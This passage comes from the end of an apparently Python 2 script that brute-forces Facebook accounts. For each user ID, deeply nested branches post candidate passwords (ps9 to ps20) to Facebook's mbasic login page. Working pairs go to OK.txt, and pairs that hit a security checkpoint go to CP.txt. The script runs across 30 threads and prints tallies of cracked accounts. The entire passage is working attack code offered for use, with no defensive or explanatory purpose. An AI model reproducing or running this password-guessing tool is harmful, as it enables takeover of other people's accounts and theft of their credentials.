																			sp = data.content
																			if 'mbasic_logout_button' in sp or 'save-device' in sp:
																				print(' \x1b[1;92m [OK] '+uid+' | '+ps9+'\033[0;97m')
																				ok = open('OK.txt', 'a')
																				ok.write(uid+'|'+ps9+'\n')
																				ok.close()
																				oks.append(uid+ps9)
																			else:
																				if 'checkpoint' in sp:
																					print(' \x1b[1;91m [CP] '+uid+' | '+ps9+'\033[0;97m')
																					cp = open('CP.txt', 'a')
																					cp.write(uid+'|'+ps9+'\n')
																					cp.close()
																					cps.append(uid+ps9)
																				else:
																					data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps10, 'login': 'submit'})
																					sp = data.content
																					if 'mbasic_logout_button' in sp or 'save-device' in sp:
																						print(' \x1b[1;92m [OK] '+uid+' | '+ps10+'\033[0;97m')
																						ok = open('OK.txt', 'a')
																						ok.write(uid+'|'+ps10+'\n')
																						ok.close()
																						oks.append(uid+ps10)
																					else:
																						if 'checkpoint' in sp:
																							print(' \x1b[1;91m [CP] '+uid+' | '+ps10+'\033[0;97m')
																							cp = open('CP.txt', 'a')
																							cp.write(uid+'|'+ps10+'\n')
																							cp.close()
																							cps.append(uid+ps10)
																						else:
																							data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps11, 'login': 'submit'})
																							sp = data.content
																							if 'mbasic_logout_button' in sp or 'save-device' in sp:
																								print(' \x1b[1;92m [OK] '+uid+' | '+ps11+'\033[0;97m')
																								ok = open('OK.txt', 'a')
																								ok.write(uid+'|'+ps11+'\n')
																								ok.close()
																								oks.append(uid+ps11)
																							else:
																								if 'checkpoint' in sp:
																									print(' \x1b[1;91m [CP] '+uid+' | '+ps11+'\033[0;97m')
																									cp = open('CP.txt', 'a')
																									cp.write(uid+'|'+ps11+'\n')
																									cp.close()
																									cps.append(uid+ps11)
																								else:
																									data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps12, 'login': 'submit'})
																									sp = data.content
																									if 'mbasic_logout_button' in sp or 'save-device' in sp:
																										print(' \x1b[1;91m [OK] '+uid+' | '+ps12+'\033[0;97m')
																										ok = open('OK.txt', 'a')
																										ok.write(uid+'|'+ps12+'\n')
																										ok.close()
																										oks.append(uid+ps12)
																									else:
																										if 'checkpoint' in sp:
																											print(' \x1b[1;91m [CP] '+uid+' | '+ps12+'\033[0;97m')
																											cp = open('CP.txt', 'a')
																											cp.write(uid+'|'+ps12+'\n')
																											cp.close()
																											cps.append(uid+ps12)
																										else:
																											data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps13, 'login': 'submit'})
																											sp = data.content
																											if 'mbasic_logout_button' in sp or 'save-device' in sp:
																												print(' \x1b[1;92m [OK] '+uid+' | '+ps13+'\033[0;97m')
																												ok = open('OK.txt', 'a')
																												ok.write(uid+'|'+ps13+'\n')
																												ok.close()
																												oks.append(uid+ps13)
																											else:
																												if 'checkpoint' in sp:
																													print(' \033[1;91m [CP] '+uid+' | '+ps13+'\033[0;97m')
																													cp = open('CP.txt', 'a')
																													cp.write(uid+'|'+ps13+'\n')
																													cp.close()
																													cps.append(uid+ps13)
																												else:
																													data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps14, 'login': 'submit'})
																													sp = data.content
																													if 'mbasic_logout_button' in sp or 'save-device' in sp:
																														print(' \x1b[1;92m [OK] '+uid+' | '+ps14+'\033[0;97m')
																														ok = open('OK.txt', 'a')
																														ok.write(uid+'|'+ps14+'\n')
																														ok.close()
																														oks.append(uid+ps14)
																													else:
																														if 'checkpoint' in sp:
																															print(' \x1b[1;91m [CP] '+uid+' | '+ps14+'\033[0;97m')
																															cp = open('CP.txt', 'a')
																															cp.write(uid+'|'+ps14+'\n')
																															cp.close()
																															cps.append(uid+ps14)
																														else:
																															data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps15, 'login': 'submit'})
																															sp = data.content
																															if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																print(' \x1b[1;91m [OK] '+uid+' | '+ps15+'\033[0;97m')
																																ok = open('OK.txt', 'a')
																																ok.write(uid+'|'+ps15+'\n')
																																ok.close()
																																oks.append(uid+ps15)
																															else:
																																if 'checkpoint' in sp:
																																	print(' \x1b[1;91m [CP] '+uid+' | '+ps15+'\033[0;97m')
																																	cp = open('CP.txt', 'a')
																																	cp.write(uid+'|'+ps15+'\n')
																																	cp.close()
																																	cps.append(uid+ps15)
																																else:
																																	data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps16, 'login': 'submit'})
																																	sp = data.content
																																	if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																		print(' \x1b[1;92m [OK] '+uid+' | '+ps16+'\033[0;97m')
																																		ok = open('OK.txt', 'a')
																																		ok.write(uid+'|'+ps16+'\n')
																																		ok.close()
																																		oks.append(uid+ps16)
																																	else:
																																		if 'checkpoint' in sp:
																																			print(' \x1b[1;91m [CP] '+uid+' | '+ps16+'\033[0;97m')
																																			cp = open('CP.txt', 'a')
																																			cp.write(uid+'|'+ps16+'\n')
																																			cp.close()
																																			cps.append(uid+ps16)
																																		else:
																																			data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps17, 'login': 'submit'})
																																			sp = data.content
																																			if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																				print(' \x1b[1;92m [OK] '+uid+' | '+ps17+'\033[0;97m')
																																				ok = open('OK.txt', 'a')
																																				ok.write(uid+'|'+ps17+'\n')
																																				ok.close()
																																				oks.append(uid+ps17)
																																			else:
																																				if 'checkpoint' in sp:
																																					print(' \x1b[1;91m [CP] '+uid+' | '+ps17+'\033[0;97m')
																																					cp = open('CP.txt', 'a')
																																					cp.write(uid+'|'+ps17+'\n')
																																					cp.close()
																																					cps.append(uid+ps17)
																																				else:
																																					data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps18, 'login': 'submit'})
																																					sp = data.content
																																					if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																						print(' \x1b[1;91m [OK] '+uid+' | '+ps18+'\033[0;97m')
																																						ok = open('OK.txt', 'a')
																																						ok.write(uid+'|'+ps18+'\n')
																																						ok.close()
																																						oks.append(uid+ps18)
																																					else:
																																						if 'checkpoint' in sp:
																																							print(' \x1b[1;91m [CP] '+uid+' | '+ps18+'\033[0;97m')
																																							cp = open('CP.txt', 'a')
																																							cp.write(uid+'|'+ps18+'\n')
																																							cp.close()
																																							cps.append(uid+ps18)
																																						else:
																																							data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps19, 'login': 'submit'})
																																							sp = data.content
																																							if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																								print(' \x1b[1;92m [OK] '+uid+' | '+ps19+'\033[0;97m')
																																								ok = open('OK.txt', 'a')
																																								ok.write(uid+'|'+ps19+'\n')
																																								ok.close()
																																								oks.append(uid+ps19)
																																							else:
																																								if 'checkpoint' in sp:
																																									print(' \x1b[1;91m [CP] '+uid+' | '+ps19+'\033[0;97m')
																																									cp = open('CP.txt', 'a')
																																									cp.write(uid+'|'+ps19+'\n')
																																									cp.close()
																																									cps.append(uid+ps19)
																																								else:
																																									data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps20, 'login': 'submit'})
																																									sp = data.content
																																									if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																										print(' \x1b[1;92m [OK] '+uid+' | '+ps20+'\033[0;97m')
																																										ok = open('OK.txt', 'a')
																																										ok.write(uid+'|'+ps20+'\n')
																																										ok.close()
																																										oks.append(uid+ps20)
																																									else:
																																										if 'checkpoint' in sp:
																																											print(' \x1b[1;91m [CP] '+uid+' | '+ps20+'\033[0;97m')
																																											cp = open('CP.txt', 'a')
																																											cp.write(uid+'|'+ps20+'\n')
																																											cp.close()
																																											cps.append(uid+ps20)
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("\x1b[1;97m-----------------------------------------------------")
	print ("\x1b[1;91m[!]\x1b[1;97mProcess has been complete")
	print ("\x1b[1;91m[!]\x1b[1;97mTotal OK  "+str(len(oks)))
	print ("\x1b[1;91m[!]\x1b[1;97mTotal CP  "+str(len(cps)))
	print("\x1b[1;97m-----------------------------------------------------")
	raw_input("\x1b[1;91m[!]\x1b[1;97mPress Enter To Back Menu ")
	menu()
	
	
if __name__ == '__main__':
	main()
